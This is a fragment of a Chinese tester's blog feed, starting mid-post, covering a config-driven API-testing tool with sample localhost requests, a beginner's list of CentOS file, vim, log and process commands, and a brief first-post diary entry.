</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">case1</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;{
</span><span class="s1">        &#34;method&#34;:&#34;POST&#34;,
</span><span class="s1">        &#34;header&#34;:{
</span><span class="s1">            &#34;content-Type&#34;:&#34;application/json&#34;,
</span><span class="s1">            &#34;Authorization&#34;:&#34;Bearer d15a43e2-ade8-4566-95b6-b3f7e7821d63&#34;
</span><span class="s1">        },
</span><span class="s1">        &#34;bodyType&#34;:&#34;multipart/form-data&#34;,
</span><span class="s1">        &#34;body&#34;:{
</span><span class="s1">            &#34;sourceSystem&#34;: &#34;corex&#34;,
</span><span class="s1">            &#34;stAppno&#34;: &#34;200000030139&#34;,
</span><span class="s1">            &#34;stGrpNo&#34;: &#34;2&#34;,
</span><span class="s1">            &#34;rpFindings&#34;: &#34;test1&#34;,
</span><span class="s1">            &#34;rpInspectCon&#34;: &#34;test结论&#34;,
</span><span class="s1">            &#34;osrContent&#34;: &#34;&#34;,
</span><span class="s1">            &#34;rpKeyword&#34;: &#34;&#34;,
</span><span class="s1">            &#34;rpChkUserId&#34;: &#34;manager&#34;,
</span><span class="s1">            &#34;rpChkUsername&#34;: &#34;管理员&#34;,
</span><span class="s1">            &#34;rpChkDt&#34;: &#34;2020-07-01T18:42:40.000&#34;,
</span><span class="s1">            &#34;rpPositivePpt&#34;: &#34;&#34;,
</span><span class="s1">            &#34;rpCriticalGrade&#34;: &#34;&#34;,
</span><span class="s1">            &#34;tisID&#34;: &#34;df319296aa714e4dafef813781f6b7a1&#34;
</span><span class="s1">        },
</span><span class="s1">        &#34;files&#34;:{
</span><span class="s1">            &#34;file&#34;:&#34;C:/Users/rui/Pictures/Saved Pictures/test.png&#34;,
</span><span class="s1">            &#34;file1&#34;:&#34;C:/Users/rui/Pictures/Saved Pictures/test.png&#34;
</span><span class="s1">        },
</span><span class="s1">        &#34;respParams&#34;:{
</span><span class="s1">            &#34;data,token_type&amp;data,access_token&#34;:&#34;case3,header,Authorization&#34;
</span><span class="s1">        },
</span><span class="s1">        &#34;&#34;
</span><span class="s1">    }&#39;</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><code>method</code>：参数值：<code>GET</code>、<code>POST</code></p>
</li>
<li>
<p><code>header</code>：键值对</p>
</li>
<li>
<p><code>bodyType</code>：参数值：</p>
<ul>
<li><code>urlParams</code>：如果是<code>URL</code>上的参数写到<code>body</code>中的时候，<code>bodyType</code>需要写入该值</li>
<li><code>json</code>：<code>json</code>形式的请求体</li>
<li><code>multipart/form-data</code>：表单格式的请求体</li>
</ul>
</li>
<li>
<p><code>body</code>：键值对，支持嵌套</p>
<ul>
<li><code>GET</code>：<code>url</code>上的键值对可以写到<code>body</code>上，不能嵌套</li>
<li><code>POST</code>：支持嵌套的<code>json</code>类型</li>
<li>表单格式：键值对的参数可以写到<code>body</code>上，如果有文件上传，写到下面的<code>files</code></li>
</ul>
</li>
<li>
<p><code>files</code>：键为文件的<code>key</code>，值为文件地址，可以写多个键值对，不能嵌套</p>
</li>
<li>
<p><code>response</code>：将<code>json</code>返回值的参数取出，写入到其它<code>case</code>的参数中</p>
<ul>
<li>
<p>一个参数对应一个参数，取<code>data,token_type</code>中的参数放到<code>case3,header,Authorization</code>中</p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-json" data-lang="json"><span class="err">response:</span><span class="p">{</span>
	<span class="nt">&#34;data,token_type&#34;</span><span class="p">:</span><span class="s2">&#34;case3,header,Authorization&#34;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>多个参数对应一个参数，取<code>data,token_type</code>和<code>data,access_token</code>中的值拼接起来放到<code>case3,header,Authorization</code>中</p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-json" data-lang="json"><span class="err">response:</span><span class="p">{</span>
	<span class="nt">&#34;data,token_type&amp;data,access_token&#34;</span><span class="p">:</span><span class="s2">&#34;case3,header,Authorization&#34;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div></li>
</ul>
</li>
</ul>
]]></description>
</item><item>
    <title>接口测试小工具</title>
    <link>https://testoai.github.io/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</link>
    <pubDate>Sun, 11 Apr 2021 00:00:00 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</guid>
    <description><![CDATA[<ul>
<li>开篇啰嗦</li>
</ul>
<p>这篇废话太多了，写的也太乱了，做完了新开一篇总结的</p>
<p>之前也写过接口测试工具，不过测试数据是放到Excel里面维护的</p>
<p>前段时间和两个测试大佬聊，他们好像不太看好把测试数据维护到Excel里面</p>
<p>所以现在利用业余时间重新做一个，把数据放到配置文件里面</p>
<p>思路和过程还有进度就展示在这里了</p>
<p>啥时候有雏形的时候就放到<code>github</code>上去</p>
<h2 id="20210417-1240更新">2021.04.17 12:40更新</h2>
<h2 id="已经完成的">已经完成的</h2>
<p>2021.04.17 12:40</p>
<ul>
<li>1.读取配置文件</li>
<li>2.发送请求</li>
<li>3.把指定的返回值拼接到指定的<code>KEY</code>上</li>
</ul>
<p>2021.04.24</p>
<ul>
<li>4.对指定的返回值做判断</li>
</ul>
<h2 id="下一步的计划">下一步的计划</h2>
<p>2021.04.17 12:40</p>
<ul>
<li><del>1.对指定的返回值做判断</del></li>
<li>2.写一个日志模块</li>
<li>3.把<code>case</code>的<code>val</code>换成<code>yaml</code>格式的（这周看到了一个yaml的详细教程，不是不好解析，而是我不会😓）</li>
</ul>
<h2 id="github地址"><code>Github</code>地址</h2>
<p><code>https://github.com/ongrui/code200</code></p>
<h2 id="20210410-2338">2021.04.10 23:38</h2>
<p>周五开始做的，目前先把配置文件的思路讲一下</p>
<h3 id="配置文件">配置文件</h3>
<ul>
<li>接口地址放到一个<code>yaml</code>文件中，每个接口的case放到一个<code>yaml</code>文件中</li>
</ul>
<h4 id="url存放的配置文件">URL存放的配置文件</h4>
<ul>
<li><code>conn.yaml</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">url</span><span class="p">:</span><span class="w">
</span><span class="w">  </span>- <span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l">http://127.0.0.1/corexapi/oauth/token</span><span class="w">
</span><span class="w">    </span><span class="nt">case</span><span class="p">:</span><span class="w"> </span><span class="l">case1,case2</span><span class="w">
</span><span class="w">  </span>- <span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l">http://127.0.0.1/corexapi/external/pacs/cancelRegister</span><span class="w">
</span><span class="w">    </span><span class="nt">case</span><span class="p">:</span><span class="w"> </span><span class="l">case3,case4</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><code>url</code>：要测试的接口地址</p>
</li>
<li>
<p><code>case</code>：每个URL要执行的case，可以是多个值，对应下面的<code>case.yaml</code>的第一个<code>key</code></p>
</li>
</ul>
<h4 id="case存放的配置文件">case存放的配置文件</h4>
<ul>
<li><code>case.yaml</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">case1</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">method</span><span class="p">:</span><span class="w"> </span><span class="l">GET</span><span class="w">
</span><span class="w">  </span><span class="nt">header</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l">application/json</span><span class="w">
</span><span class="w">  </span><span class="nt">bodyType</span><span class="p">:</span><span class="w"> </span><span class="l">params</span><span class="w">
</span><span class="w">  </span><span class="nt">body</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">test</span><span class="p">:</span><span class="w"> </span><span class="m">1</span><span class="w">
</span><span class="w">    </span><span class="nt">token</span><span class="p">:</span><span class="w"> 
</span><span class="w">  </span><span class="nt">respParame</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">data,access_token</span><span class="p">:</span><span class="w"> </span><span class="l">case2,header,token</span><span class="w">
</span><span class="w"></span><span class="nt">case2</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">method</span><span class="p">:</span><span class="w"> </span><span class="l">POST</span><span class="w">
</span><span class="w">  </span><span class="nt">header</span><span class="p">:</span><span class="w"> </span><span class="l">json</span><span class="w">
</span><span class="w">    </span><span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l">application/json</span><span class="w">
</span><span class="w">    </span><span class="nt">token</span><span class="p">:</span><span class="w"> 
</span><span class="w">  </span><span class="nt">bodyType</span><span class="p">:</span><span class="w"> 
</span><span class="w">  </span><span class="nt">body</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">test</span><span class="p">:</span><span class="w"> 
</span><span class="w">  </span><span class="nt">respParame</span><span class="p">:</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><ul>
<li><code>method</code>：请求方式</li>
<li><code>header</code>：请求头，下面是请求头的内容，成对写入</li>
<li><code>bodyType</code>：<code>body</code>类型</li>
<li><code>body</code>：<code>body</code>内容</li>
<li><code>respParame</code>：目的是把返回值中想要的参数拼接到其它<code>case</code>上
<ul>
<li><code>data,access_token</code>：为返回参数的<code>key</code>，要支持嵌套结构，比如下面的例子，<code>token</code>在<code>data</code>一层里面的时候，也可以获取到</li>
<li><code>case2,header,token</code>：取到想要的参数后，把该参数拼接到的地方</li>
</ul>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
    <span class="nt">&#34;success&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span>
    <span class="nt">&#34;code&#34;</span><span class="p">:</span><span class="mi">200</span><span class="p">,</span>
    <span class="nt">&#34;msg&#34;</span><span class="p">:</span><span class="s2">&#34;请求成功&#34;</span><span class="p">,</span>
    <span class="nt">&#34;data&#34;</span><span class="p">:{</span>
        	<span class="nt">&#34;access_token&#34;</span><span class="p">:</span><span class="s2">&#34;96c0549c-f56c-4991-b351-8dad3adb40c2&#34;</span><span class="p">,</span>
        	<span class="nt">&#34;token_type&#34;</span><span class="p">:</span><span class="s2">&#34;bearer&#34;</span><span class="p">,</span>
        	<span class="nt">&#34;refresh_token&#34;</span><span class="p">:</span><span class="s2">&#34;de2ee487-6036-4770-a0a0-898086199157&#34;</span><span class="p">,</span>
       		<span class="nt">&#34;expires_in&#34;</span><span class="p">:</span><span class="mi">86399</span><span class="p">,</span>
       		<span class="nt">&#34;scope&#34;</span><span class="p">:</span><span class="s2">&#34;read write&#34;</span>
        	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="工作流程">工作流程</h3>
<ul>
<li>先读取<code>conn.yaml</code>，然后去遍历对应的<code>case</code>，拿到请求后调用请求方法，把请求对象传进去，然后再对返回值做处理</li>
</ul>
<h2 id="20210412-2022">2021.04.12 20:22</h2>
<h3 id="今日工作汇报">今日工作汇报</h3>
<p>领导把我薅到济南分部来了，今天跟领导沟通了挺多关于服务端质量保障体系相关的东西</p>
<p>在这边儿倒是停清闲，不过宾馆桌子太小了，还没插座😭，明天在公司多呆会儿</p>
<a class="lightgallery" href="/img/6EB9B7A5-619F-4A43-B634-0B1C01A19CDA.jpeg" title="/img/6EB9B7A5-619F-4A43-B634-0B1C01A19CDA.jpeg" data-thumbnail="/img/6EB9B7A5-619F-4A43-B634-0B1C01A19CDA.jpeg">
        
    </a>
<a class="lightgallery" href="/img/1CF695B2-456D-45A9-B80B-9639E8B46CAC.jpeg" title="/img/1CF695B2-456D-45A9-B80B-9639E8B46CAC.jpeg" data-thumbnail="/img/1CF695B2-456D-45A9-B80B-9639E8B46CAC.jpeg">
        
    </a>
<p>嘿嘿，可以没有鼠标，但是不能没有键盘</p>
<p>废话不说了，汇报工作正式开始</p>
<h4 id="修改yaml配置文件">修改<code>yaml</code>配置文件</h4>
<ul>
<li>1.我把<code>case</code>的<code>val</code>改成了<code>json</code>形式的，<code>yaml</code>不好解析，改完就是下面这样</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">case1</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;{
</span><span class="s1">        &#34;method&#34;:&#34;POST&#34;,
</span><span class="s1">        &#34;header&#34;:{
</span><span class="s1">            &#34;content-Type&#34;:&#34;application/json&#34;
</span><span class="s1">        },
</span><span class="s1">        &#34;bodyType&#34;:&#34;form-data&#34;,
</span><span class="s1">        &#34;body&#34;:{
</span><span class="s1">            &#34;sourceSystem&#34;: &#34;corex&#34;,
</span><span class="s1">            &#34;stAppno&#34;: &#34;0xx83hd8j3972&#34;,
</span><span class="s1">            &#34;stGrpNo&#34;: &#34;2&#34;,
</span><span class="s1">            &#34;rpFindings&#34;: &#34;测试所见&#34;,
</span><span class="s1">            &#34;rpInspectCon&#34;: &#34;测试结论&#34;,
</span><span class="s1">            &#34;osrContent&#34;: &#34;&#34;,
</span><span class="s1">            &#34;rpKeyword&#34;: &#34;&#34;,
</span><span class="s1">            &#34;rpChkUserId&#34;: &#34;manager&#34;,
</span><span class="s1">            &#34;rpChkUsername&#34;: &#34;管理员&#34;,
</span><span class="s1">            &#34;rpChkDt&#34;: &#34;2021-01-01T18:42:40.000&#34;,
</span><span class="s1">            &#34;rpPositivePpt&#34;: &#34;&#34;,
</span><span class="s1">            &#34;rpCriticalGrade&#34;: &#34;&#34;,
</span><span class="s1">            &#34;tisID&#34;: &#34;df3192o4icu14e4daf9jf83781f6b7a1&#34;
</span><span class="s1">        },
</span><span class="s1">        &#34;files&#34;:{
</span><span class="s1">            &#34;file&#34;:&#34;test.png&#34;,
</span><span class="s1">            &#34;filePath&#34;:&#34;../files/test.png&#34;
</span><span class="s1">        }
</span><span class="s1">    }&#39;</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><h4 id="配置文件读取相关代码">配置文件读取相关代码</h4>
<ul>
<li>2.今天把读取配置文件的写完了，贴个图吧，写的太烂，面向<code>struct</code>编程理解的太浅（看图得新建个标签页😂）</li>
</ul>
<a class="lightgallery" href="/img/image20210412215219.png" title="/img/image20210412215219.png" data-thumbnail="/img/image20210412215219.png">
        
    </a>
<h2 id="20210417-1601">2021.04.17 16:01</h2>
<p>完成了读取配置文件的业务、请求业务，还可以将<code>json</code>格式的<code>response</code>中指定<code>KEY</code>的值写入到其它的请求体或者请求头里面去</p>
<p>这周看到了一篇关于<code>YAML</code>的详细文档，发现也很好解析，当时只是我自己菜，没有去网上仔细搜下😥，回头再改回<code>yaml</code>格式的​</p>
<p>我的垃圾代码已经提交到了<code>github</code>上了，算是做个记录吧<code>https://github.com/ongrui/code200</code></p>
<p>还有关于文章的</p>
<p>图片可以放大了，把文章头部预览去掉了</p>
]]></description>
</item><item>
    <title>linux(Centos7)相关命令 持续更新...</title>
    <link>https://testoai.github.io/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</link>
    <pubDate>Sat, 10 Apr 2021 00:00:00 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</guid>
    <description><![CDATA[<h1 id="开篇啰嗦">开篇啰嗦</h1>
<p>啥时候更新时间间隔超过三个月我就把持续更新去掉</p>
<p>话说作为一个测试，第一篇文章是不是应该得是测试相关的</p>
<p>唉，在公司学的最多的就是linux</p>
<p>先写这个吧，明天再写一篇测试相关的</p>
<p>下面都是我目前能想到或工作中常用的</p>
<h2 id="文件操作相关">文件操作相关</h2>
<h3 id="文件拷贝-cp">文件拷贝 cp</h3>
<ul>
<li>拷贝文件：<code>cp 要拷贝的文件 目标路径</code></li>
<li>拷贝文件<code>redis.conf</code>到<code>/etc/</code>目录下</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui redis-6.2.0]# cp redis.conf /etc/
[root@rui redis-6.2.0]# ls /etc/redis.conf 
/etc/redis.conf
</code></pre></td></tr></table>
</div>
</div><ul>
<li>拷贝文件夹：<code>cp -r 要拷贝的文件夹 目标路径</code></li>
<li>拷贝文件夹<code>redis-6.2.0</code>到<code>/usr/local/</code>目录下</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui home]# cp -r redis-6.2.0/ /usr/local/
[root@rui home]# ls /usr/local/
bin  games    lib    libexec  redis-6.2.0  share
etc  include  lib64  proc     sbin         src
</code></pre></td></tr></table>
</div>
</div><h3 id="文件移动-mv">文件移动 mv</h3>
<ul>
<li>移动文件夹/文件：<code>mv 要移动的文件夹或者是文件 目标路径</code></li>
<li>移动文件<code>redis.conf</code>到<code>src</code>目录下</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui redis-6.2.0]# mv redis.conf src/
[root@rui redis-6.2.0]# ls src/redis.conf 
src/redis.conf
</code></pre></td></tr></table>
</div>
</div><h3 id="文件查找">文件查找</h3>
<ul>
<li>方式一：<code>find 要查找的路径 -name 要查找的文件</code></li>
<li><code>find</code>会遍历指定路径下的所有文件，然后返回符合条件的，支持模糊查询</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui redis-6.2.0]# find ./ -name redis.c*
./src/redis.conf
</code></pre></td></tr></table>
</div>
</div><ul>
<li>方式二：<code>locate 要查找的文件</code></li>
<li><code>locate</code> 在<code>/var/lib/mlocate/</code>目录下存放着一个数据库文件，其实使用<code>locate</code>查询是查询的数据库，所以<code>locate</code>非常快</li>
<li><code>locate</code>会返回所有包含文件名的文件</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui redis-6.2.0]# locate /home/redis-6.2.0/src/red
/home/redis-6.2.0/src/redis-benchmark
/home/redis-6.2.0/src/redis-benchmark.c
/home/redis-6.2.0/src/redis-benchmark.d
/home/redis-6.2.0/src/redis-benchmark.o
/home/redis-6.2.0/src/redis-check-aof
/home/redis-6.2.0/src/redis-check-aof.c
/home/redis-6.2.0/src/redis-check-aof.d
/home/redis-6.2.0/src/redis-check-aof.o
/home/redis-6.2.0/src/redis-check-rdb
/home/redis-6.2.0/src/redis-check-rdb.c
/home/redis-6.2.0/src/redis-check-rdb.d
/home/redis-6.2.0/src/redis-check-rdb.o
/home/redis-6.2.0/src/redis-cli
/home/redis-6.2.0/src/redis-cli.c
/home/redis-6.2.0/src/redis-cli.d
/home/redis-6.2.0/src/redis-cli.o
/home/redis-6.2.0/src/redis-sentinel
/home/redis-6.2.0/src/redis-server
/home/redis-6.2.0/src/redis-trib.rb
/home/redis-6.2.0/src/redis.conf
/home/redis-6.2.0/src/redisassert.h
/home/redis-6.2.0/src/redismodule.h
</code></pre></td></tr></table>
</div>
</div><p>然后新建一个文件，再查询一次</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui redis-6.2.0]# &gt; /home/redis-6.2.0/src/testfile
[root@rui redis-6.2.0]# locate /home/redis-6.2.0/src/testf
[root@rui redis-6.2.0]# ll /home/redis-6.2.0/src/testfile 
-rw-r--r--. 1 root root 0 Apr 10 22:37 /home/redis-6.2.0/src/testfile
</code></pre></td></tr></table>
</div>
</div><p>可以看到，没有查到，因为<code>locate</code>的数据库不是实时更新的，可以使用<code>updatedb</code>手动更新，也可以把更新命令配置到系统的任务计划表，定时执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui redis-6.2.0]# updatedb
[root@rui redis-6.2.0]# locate /home/redis-6.2.0/src/testf
/home/redis-6.2.0/src/testfile
</code></pre></td></tr></table>
</div>
</div><p>可以看到更新之后就查到了</p>
<h2 id="vim相关"><code>vim</code>相关</h2>
<h3 id="进入编辑模式">进入编辑模式</h3>
<ul>
<li>按<code>i</code>进入编辑模式后光标会在当前位置</li>
<li>按<code>I</code>进入编辑模式后光标会在当前行行首</li>
<li>按<code>a</code>进入编辑模式后，光标在当前字符后</li>
<li>按<code>A</code>进入编辑模式后，光标会在当前行行尾</li>
<li>按<code>o</code>进入编辑模式后，会在当前行下一行新开一行</li>
<li>按<code>O</code>进入编辑模式后，会在当前行上一行新开一行</li>
</ul>
<p><code>我用的最多的是i</code></p>
<h3 id="退出编辑模式">退出编辑模式</h3>
<ul>
<li>按<code>ESC</code>退出编辑模式</li>
</ul>
<h3 id="查找">查找</h3>
<ul>
<li>使用：<code>/要查找的内容</code></li>
<li>使用<code>vim /文件名</code>打开文件后，输入<code>/</code>要查找的内容即可，比如下面我要在<code>redis.conf</code>配置文件中查找<code>bind</code>关键字</li>
</ul>
<a class="lightgallery" href="/img/image-20210410145934938.png" title="/img/image-20210410145934938.png" data-thumbnail="/img/image-20210410145934938.png">
        
    </a>
<ul>
<li>
<p>然后可以输入回车，会查找到该文件中第一个<code>bind</code>，可以输入<code>n</code>定位到下一个，输入<code>N</code>定位到上一个</p>
</li>
<li>
<p>取消高亮可以输入<code>nohlsearch</code>，简写为<code>noh</code>，也可以输入<code>set nohlsearch</code> ，简写为<code>set noh</code></p>
</li>
</ul>
<h3 id="替换">替换</h3>
<ul>
<li>
<p>把文件中的所有<code>127.0.0.1</code>替换为<code>120.5.5.153</code></p>
<ul>
<li>使用：<code>:%s/127.0.0.1/120.5.5.153/g</code></li>
</ul>
</li>
<li>
<p>把当前行的<code>127.0.0.1</code>替换为<code>120.5.5.153</code></p>
<ul>
<li>使用：<code>:S/127.0.0.1/120.5.5.153/g</code></li>
</ul>
</li>
</ul>
<p><code>还有很多替换相关的命令，这里只是写了常用的</code></p>
<h3 id="退出">退出</h3>
<ul>
<li>退出不保存<code>:q</code></li>
<li>强制退出不保存<code>:q!</code></li>
<li>保存并退出<code>:wq</code></li>
<li>强制保存并退出<code>:wq!</code></li>
</ul>
<h2 id="查看日志">查看日志</h2>
<h3 id="实时刷新查看日志">实时刷新查看日志</h3>
<ul>
<li>方式一：使用：<code>tail -f -n 10 日志文件名称</code>
<ul>
<li><code>-f</code>：实时刷新</li>
<li><code>-n</code>：行数关键字，后面跟行数，表示从后10行开始查看</li>
</ul>
</li>
<li>方式二：使用：<code>tailf 日志文件名称</code>
<ul>
<li>默认从后十行开始查看</li>
</ul>
</li>
</ul>
<h3 id="查看日志前10行">查看日志前10行</h3>
<ul>
<li>使用：<code>head -n 行数 日志文件名称</code>
<ul>
<li><code>-n</code> ：行数关键字</li>
</ul>
</li>
</ul>
<h3 id="查看第10行到第20行">查看第10行到第20行</h3>
<ul>
<li>方式一：使用：<code>sed -n '10,20p' 日志文件名称</code>
<ul>
<li><code>-n</code>：打印制定行</li>
<li><code>'10,20p'</code>：指定的行号</li>
</ul>
</li>
<li>方式二：使用：<code>cat -n 日志文件名称 | head -n 20 | tail -n +10</code>
<ul>
<li><code>cat -n</code>：打印日志显示行号</li>
<li><code>head -n 20</code>：打印到20行</li>
<li><code>tail -n +10</code>：从第10行开始打印</li>
</ul>
</li>
</ul>
<p>2021.04.20</p>
<h2 id="查看进程">查看进程</h2>
<h3 id="ps命令">ps命令</h3>
<p>ps （英文全拼：process status）命令用于显示当前进程的状态 &ndash;摘自菜鸟教程</p>
<h4 id="参数">参数</h4>
<ul>
<li>-a：列出所有进程</li>
<li>-w：显示加宽，可以显示更多内容</li>
<li>-u：以用户为主的进程状态</li>
<li>-x：显示当前用户在所有终端下的进程信息，通常和参数<code>a</code>一起使用</li>
<li>-e：显示系统内所有的进程信息</li>
<li>-l：使用长格式显示进程信息</li>
<li>-f：使用完整的格式显示进程信息</li>
</ul>
<h4 id="筛选">筛选</h4>
<ul>
<li>在输入了上面命令后添加<code>|grep processName/processID</code></li>
</ul>
<h3 id="根据进程查找文件">根据进程查找文件</h3>
<ul>
<li>当因为某种原因找不到服务的存放位置时，可以使用上面的命令先查看进程的ID</li>
<li>然后使用命令：<code>pwdx processID</code>命令查找该进程文件存放的位置</li>
</ul>
<h2 id="查看端口号是否被监听">查看端口号是否被监听</h2>
<p><code>lsof -i:prot</code></p>
]]></description>
</item><item>
    <title>第一篇文章</title>
    <link>https://testoai.github.io/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</link>
    <pubDate>Sun, 04 Apr 2021 00:00:00 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</guid>
    <description><![CDATA[<h1 id="第一篇文章">第一篇文章</h1>
<p>写点儿啥呢</p>
<p>这两天一直在弄博客，昨天弄了一天icon，</p>
<p>hugo的文档有点儿多，没找到config.toml的说明文档 [手动笑哭]</p>
<p>最后各种Google，昨晚终于弄好了</p>
<p>其实昨天一直边玩儿边搞，在家弄效率是不太高 ^_^</p>
<p>但是这个为啥不兼容markdown的表情 ToT</p>
<p>今天是清明节，本来打算回家&hellip;，改到五一假期再回吧</p>
